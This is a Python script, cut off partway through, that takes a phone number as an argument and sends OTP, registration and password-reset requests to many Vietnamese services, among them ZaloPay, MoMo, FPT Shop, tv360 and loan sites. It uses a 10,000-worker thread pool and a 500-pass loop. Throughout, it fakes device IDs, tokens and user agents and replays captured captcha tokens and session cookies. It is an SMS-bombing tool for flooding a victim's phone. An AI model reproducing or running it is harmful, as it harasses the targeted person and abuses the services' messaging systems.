import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib, random ,time
from datetime import datetime
import bs4,base64
from time import sleep
import requests
import os, sys, requests, random, json
import time
from re import search
from random import choice, randint, shuffle
phone = sys.argv[1]
amount = 500 ##vòng lặp
threading = ThreadPoolExecutor(max_workers=int(10000))
imei = uuid.uuid4()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
jsdt = {'phone_number': phone}
json_data = {
'feature': 'register',
'phone': '+84'+phone[1:11]}
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
params = {'phone_number': "0"+phone[1:11]}
headerss = {
'Host': 'moca.vn',
'Accept': '*/*',
'Device-Token': str(imei),
'X-Requested-With': 'XMLHttpRequest',
'Accept-Language': 'vi',
'X-Moca-Api-Version': '2',
'platform': 'P_IOS-2.10.42',
'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)'}
paramss = {'phoneNumber': phone}

def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def xx(phone):
	token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
	json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
	response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###
def xxx(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
def a0(phone):
  headers = {
        'authority': 'muaban.net',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://muaban.net',
    'referer': 'https://muaban.net/account/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'captcha': '03ADUVZwAcGqEyyPxtlPY4Gl1NgkghIemdliv-v-8whFZ8P131cX6J2PYghNkgezwty91Hkvc6W7StoCSHNrkbraEyFkItBEy2x1mv4ygZKoJrF4XOTvRg6XCaxj5iJTbZuZ_KtAeK5E2apZtYGRmo4lIAurN1f_ABwuiLmCOYr2bMrBPJ5QFvFmSx32lTEL4I63XzIrusOa2rkkj6Apl-SWJ65QOu6U_rD7PzigRoLRNORcDBcPIDBWi3PIdZal6pcmySiRDVWnqA96jzAC_e6k21fFdie3EbeM0zSY76gFZdw4PJXOA3T-J1HRM6qCQSPg2ieiK0cQ_fyKAKP-UZLZ-Adszq4KGPRzJWkoFbsYhrol29vp9LDkZLz660k7h6VFhFgoTSwPiuYw1uxf9cY6hIHYFLM92w_LsQ9DNEyjtQT5Wnkt6XRqxF96cd9kjPC09iy8N57C8uOW6Tyw1U7zFC6DPTH6XU3vtDuKupECSKUjkdn9ofuMORmR-kNt8tXch0kVW8SKHWKst0O4tNPrqxwFTO4IFGfQ',
    'phone': phone,
    'is_register': True,
}

  response = requests.post('https://muaban.net/identity/v1/otps/send', headers=headers, json=json_data)

def a1(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def a2(phone):
	requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
def a3(phone):
  cookies = {
        'tts-utm-source': 'googlese',
    'tts_analytics_guest_id': 'KcJ8kcv2yoB_HmJ2jAeyq',
    'XSRF-TOKEN': 'w8bkzBB87P2JJM7xB0vnaX01mrpDncsjgWgft5i6',
    'laravel_session': 'Y1dYlFAjILNvV2icXH1CbK6jHZT36yLfGFltw87O',
    '_gcl_au': '1.1.1694890977.1692777330',
    '_ga': 'GA1.1.1851201171.1692777330',
    '_hjSessionUser_1638305': 'eyJpZCI6IjNkMWRkYzJiLWU5NzEtNTY4OS04MWZiLTBhOTQ3MDNmNzcyOSIsImNyZWF0ZWQiOjE2OTI3NzczMzA1NzcsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_1638305': '0',
    '_hjSession_1638305': 'eyJpZCI6Ijg0NTE0MjIwLTQxMTYtNGJlZC04ZWY1LWQyMWFmMGFhZTg0NyIsImNyZWF0ZWQiOjE2OTI3NzczMzA1ODksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    'NPS_81d9bd77_last_seen': '1692777330610',
    '_ym_uid': '1692777332339492154',
    '_ym_d': '1692777332',
    '_ym_isad': '1',
    '_ym_visorc': 'w',
    '_ga_W85LP5ZTQK': 'GS1.1.1692777330.1.1.1692777344.46.0.0',
    }
  headers = {
        'authority': 'thitruongsi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://thitruongsi.com',
    'referer': 'https://thitruongsi.com/user/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'w8bkzBB87P2JJM7xB0vnaX01mrpDncsjgWgft5i6',
}
  json_data = {
    'account_phone': phone,
    'recaptcha_token': '03ADUVZwBVmGIojbIrLuRboS6LWXDSntLMZYFUiwAM47ossGEgHMMFOuWl0ENG6faF1e5zOvuu-U0a7-LJVrKXLpOyvUawuP2iuwHSRVJlKkJzKZ-GHxJFReoSjjRRvofpI4jyxeCq1iZgaPg49pUwTyEOeAjO-kwBGVqhQtc93wUw1tiv9jJ_aj9kryrOIcjrPI76Jadz4eGbtl3afKh6ZCrZszjrNYV-R4AUPNTGl3aNcBRUKXZFpHbMWlE3ggI3ksUz9TvopPp8YKzIdpLfcAmqoRCeY0wJHEKE8k27JyOlP_uVSZPXJqe1hsCiUjdNlT8e6IiRtmoPKSrPHyVIdEvjEyfIRnDBAD-JPLcW-4LiNPsvi_REP_i8m7-zYe-1oghyo9Np1LNM44ALzdlgX0MaQL19vT5PlElf71qUOXeDmfA8KIdnCZPxsG2JCEaAm3YsxaOaP7xLH7nc5PT7eALXBqSdV1NFUjyar71B-1R0EFfUVv5Iwe9qiY-wZSLfZzBUZiY-UCWh9-fVDiPWz4-SAxKRc5-U8A4lUjalCRl-xFPke7fOG2OWg7hwUTAgTSOEzAEGUndb',
}

  response = requests.post(
    'https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def a4(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def a5(phone):
  cookies = {
        '_gcl_au': '1.1.1480282586.1692882868',
    '_gid': 'GA1.2.2072299016.1692882869',
    '_fbp': 'fb.1.1692882869073.27624022',
    '_ga_K15C064VTW': 'GS1.2.1692882869.1.0.1692882869.60.0.0',
    '_tt_enable_cookie': '1',
    '_ttp': 'Xwft9cKpH_9ghm7lPTTpq8dKl1B',
    '_hjSessionUser_2281843': 'eyJpZCI6ImVmZGQ5ZGUwLTE0ZmItNTcwNi1hMWY0LTQwYmJjMDNjNmU0NSIsImNyZWF0ZWQiOjE2OTI4ODI4NjkwMjIsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_2281843': '0',
    '_hjSession_2281843': 'eyJpZCI6ImIyM2E4YTdmLWUwYmEtNGUwNC1iMWI3LWEzNWYyOGJmYzRjZSIsImNyZWF0ZWQiOjE2OTI4ODI4Njk1MjYsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_fw_crm_v': '00203e0f-e9c3-4704-c156-a87a785043ad',
    '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDgyMzQ2MTg5OA.j-8fAt8R6Ad2itEc_75Zn3rmbGMRnBf__hfsn5mIEmI',
    '_ga_ZBQ18M247M': 'GS1.1.1692882868.1.0.1692882876.52.0.0',
    '_hjIncludedInSessionSample_2281853': '0',
    '_hjSession_2281853': 'eyJpZCI6ImFhNzAxOWNhLTUxMjgtNDU2NS1hYmIxLTdiZjM0NTk4MWJmOSIsImNyZWF0ZWQiOjE2OTI4ODI4Nzg2ODAsImluU2FtcGxlIjpmYWxzZX0=',
    '_ga_ZN0EBP68G5': 'GS1.1.1692882876.1.1.1692882897.39.0.0',
    '_hjSessionUser_2281853': 'eyJpZCI6IjhlYzg2NjdjLThjNWItNTJjZS04ODc4LTRmNWVhMGM4ZGFiYiIsImNyZWF0ZWQiOjE2OTI4ODI4NzYzMjAsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga': 'GA1.2.1780396928.1692882869',
    '_ga_03H0F9NHEX': 'GS1.2.1692882876.1.1.1692882898.38.0.0',
    }
  headers = {
        'authority': 'lk.takomo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.1480282586.1692882868; _gid=GA1.2.2072299016.1692882869; _fbp=fb.1.1692882869073.27624022; _ga_K15C064VTW=GS1.2.1692882869.1.0.1692882869.60.0.0; _tt_enable_cookie=1; _ttp=Xwft9cKpH_9ghm7lPTTpq8dKl1B; _hjSessionUser_2281843=eyJpZCI6ImVmZGQ5ZGUwLTE0ZmItNTcwNi1hMWY0LTQwYmJjMDNjNmU0NSIsImNyZWF0ZWQiOjE2OTI4ODI4NjkwMjIsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6ImIyM2E4YTdmLWUwYmEtNGUwNC1iMWI3LWEzNWYyOGJmYzRjZSIsImNyZWF0ZWQiOjE2OTI4ODI4Njk1MjYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fw_crm_v=00203e0f-e9c3-4704-c156-a87a785043ad; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDgyMzQ2MTg5OA.j-8fAt8R6Ad2itEc_75Zn3rmbGMRnBf__hfsn5mIEmI; _ga_ZBQ18M247M=GS1.1.1692882868.1.0.1692882876.52.0.0; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6ImFhNzAxOWNhLTUxMjgtNDU2NS1hYmIxLTdiZjM0NTk4MWJmOSIsImNyZWF0ZWQiOjE2OTI4ODI4Nzg2ODAsImluU2FtcGxlIjpmYWxzZX0=; _ga_ZN0EBP68G5=GS1.1.1692882876.1.1.1692882897.39.0.0; _hjSessionUser_2281853=eyJpZCI6IjhlYzg2NjdjLThjNWItNTJjZS04ODc4LTRmNWVhMGM4ZGFiYiIsImNyZWF0ZWQiOjE2OTI4ODI4NzYzMjAsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.2.1780396928.1692882869; _ga_03H0F9NHEX=GS1.2.1692882876.1.1.1692882898.38.0.0',
    'origin': 'https://lk.takomo.vn',
    'referer': 'https://lk.takomo.vn/?phone=0823461898&amount=10000000&term=30&utm_source=goodaff_cps&utm_medium=cpa&utm_campaign=for-lead&utm_content=2&click_id=02e7eeead2d4b90cda9bc7ec24aa5e70',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  json_data = {
    'data': {
        'phone': phone,
        'code': 'resend',
        'channel': 'ivr',
    },
}

  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
def a6(phone):
	cookies = {
    '_ym_uid': '1692727549534820669',
    '_ym_d': '1692727549',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
}

	headers = {
    'authority': 'api.vayvnd.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_ym_uid=1692727549534820669; _ym_d=1692727549; _ym_isad=2; _ym_visorc=w',
    'origin': 'https://vayvnd.vn',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'login': phone,
}

	response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
def a7(phone):
    cookies = {
        '_ga': 'GA1.1.2119247840.1692883566',
    'serverChoice': 'Server-IPv3',
    '_ga_Y4RF4MF664': 'GS1.1.1692883566.1.1.1692883715.0.0.0',
    }

    headers = {
        'authority': 'onlytris.x10.mx',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.2119247840.1692883566; serverChoice=Server-IPv3; _ga_Y4RF4MF664=GS1.1.1692883566.1.1.1692883715.0.0.0',
    'origin': 'https://onlytris.x10.mx',
    'referer': 'https://onlytris.x10.mx/sms.php',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    data = {

        'sodienthoai': phone,
    'ten_server': 'Server-IPv3',
    'key': 'TRIS_Xald83au2j',
    }

    response = requests.post('https://onlytris.x10.mx/sms.php', cookies=cookies, headers=headers, data=data)
def a8(phone):
  cookies = {
        'lang': 'vi-VN',
    '_gid': 'GA1.2.162175187.1692767917',
    '_gcl_au': '1.1.1392401524.1692767918',
    'c': 'zMXcyX4X-1692767920021-3f46874aecdd11814596635',
    '_ga': 'GA1.3.20410514.1692767917',
    '_gid': 'GA1.3.162175187.1692767917',
    '_gac_UA-55135171-7': '1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    'MgidSensorUtmSource': 'google',
    'MgidSensorClidV': '0',
    '_fbp': 'fb.1.1692767920777.185567813',
    '_tt_enable_cookie': '1',
    '_ttp': 'eezki2H7q3-MigGjGivw9VHcKmT',
    '_SI_VID_1.43672efc5d000118b53cfe67': '21b15ab3630a453252c171e9',
    '_SI_DID_1.43672efc5d000118b53cfe67': '6343c55f-d611-3f08-850c-19d2aec3a9c9',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'aZY9EGoYugdC/DBk4FGNGyzSwbbr7lNgAO0pOT/Mzz4=',
    'trackingId': 'prescore-3794d538-2e06-4f77-98a8-ad1cec99eea5',
    '_gcl_aw': 'GCL.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_gac_UA-166784548-1': '1.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_ga': 'GA1.2.20410514.1692767917',
    '_gac_UA-55135171-7': '1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    '_ga_HQ2YVF8108': 'GS1.3.1692767920.1.1.1692768080.0.0.0',
    'MgidSensorNVis': '6',
    'MgidSensorHref': 'https://vaytienmat.homecredit.vn/bat-dau-vay',
    '_fmdata': 'hn%2BAOPSKPYxJSzgnVZfTO1ymgXJSaRzSsKwMEjI%2BjTn7JFFh%2BLV1Oe62zGDhtY8LIURfbdxxsTalgm1WjGIJ0g%3D%3D',
    '_xid': 'GI0Ie3qID8VUMZXwXBp4LMadvknzeVZvQGjLN233XJw%3D',
    '_ga_HQ2YVF8108': 'GS1.2.1692767920.1.1.1692768093.0.0.0',
    '_ga_9H7XV0QXGV': 'GS1.1.1692767920.1.1.1692768093.0.0.0',
    '_SI_SID_1.43672efc5d000118b53cfe67': 'ec890976f3a5645d2f41b6f8.1692768594885.326232',
    'TS01eb369c': '01798ff5ed492627bbdbf2744a5df9067ade28c5b1ebf0f8de63d50e763cfaa6d55d7f0d57aca9cb5128da7de02ae11165f84161cc',
    }
  headers = {
        'Accept': 'application/json',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Access-Control-Allow-Origin': '*',
    'Authorization': 'Bearer 03ADUVZwCwosla2qGLouhsjaF363ixyj04Y6SenuquXO3msgII3g3bzUi8Pjn8XTs69T_pXR92qaLzX4QjTxCJgUf2nc6TMYKIsgidE5G4NpMPpDlCZ8XRmkjEgowKeaY_HavlYV9rdnsfmBSXYbM2zpWvg6a1MShm3cwFTGEggn6g3Gr-OoWBFKKSSCKZlZy3HGxcYJ2k6DlOGqhEJWnFf4iIks0hvGRaer7IY0WFHntAqMOGLBP31Eeu7t7QLSsi1VkKH6Odeye8eZtie7JlYOchksB6M5A-LzWrPVrUw1zh71OeztZ-Ecss63QDlJu4FatjtsGPbcRCGzn5QkE8hnI-YydlcmitF04igviSgb6Gkt5gbwCWKz6kwAOJUJQMS02l8YAZKJ0Dhx1oW3WpISWjqrazlVw0oK1MD2eFO8x7tSbaALXRMMfIFI304QdjnKdnkhvpdlg8uputPID9HHZuxtJKXQNeTm1OE117NaK5nFvCIs4ydIKqB5lq5YDjX0Ovc1gFKb4GPJ-CIwdfUJsO0EBm-mmqtuN_UcolykWHGoM4hx1F1V8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'lang=vi-VN; _gid=GA1.2.162175187.1692767917; _gcl_au=1.1.1392401524.1692767918; c=zMXcyX4X-1692767920021-3f46874aecdd11814596635; _ga=GA1.3.20410514.1692767917; _gid=GA1.3.162175187.1692767917; _gac_UA-55135171-7=1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; MgidSensorUtmSource=google; MgidSensorClidV=0; _fbp=fb.1.1692767920777.185567813; _tt_enable_cookie=1; _ttp=eezki2H7q3-MigGjGivw9VHcKmT; _SI_VID_1.43672efc5d000118b53cfe67=21b15ab3630a453252c171e9; _SI_DID_1.43672efc5d000118b53cfe67=6343c55f-d611-3f08-850c-19d2aec3a9c9; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=aZY9EGoYugdC/DBk4FGNGyzSwbbr7lNgAO0pOT/Mzz4=; trackingId=prescore-3794d538-2e06-4f77-98a8-ad1cec99eea5; _gcl_aw=GCL.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _gac_UA-166784548-1=1.1692767985.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _ga=GA1.2.20410514.1692767917; _gac_UA-55135171-7=1.1692767920.EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE; _ga_HQ2YVF8108=GS1.3.1692767920.1.1.1692768080.0.0.0; MgidSensorNVis=6; MgidSensorHref=https://vaytienmat.homecredit.vn/bat-dau-vay; _fmdata=hn%2BAOPSKPYxJSzgnVZfTO1ymgXJSaRzSsKwMEjI%2BjTn7JFFh%2BLV1Oe62zGDhtY8LIURfbdxxsTalgm1WjGIJ0g%3D%3D; _xid=GI0Ie3qID8VUMZXwXBp4LMadvknzeVZvQGjLN233XJw%3D; _ga_HQ2YVF8108=GS1.2.1692767920.1.1.1692768093.0.0.0; _ga_9H7XV0QXGV=GS1.1.1692767920.1.1.1692768093.0.0.0; _SI_SID_1.43672efc5d000118b53cfe67=ec890976f3a5645d2f41b6f8.1692768594885.326232; TS01eb369c=01798ff5ed492627bbdbf2744a5df9067ade28c5b1ebf0f8de63d50e763cfaa6d55d7f0d57aca9cb5128da7de02ae11165f84161cc',
    'Origin': 'https://vaytienmat.homecredit.vn',
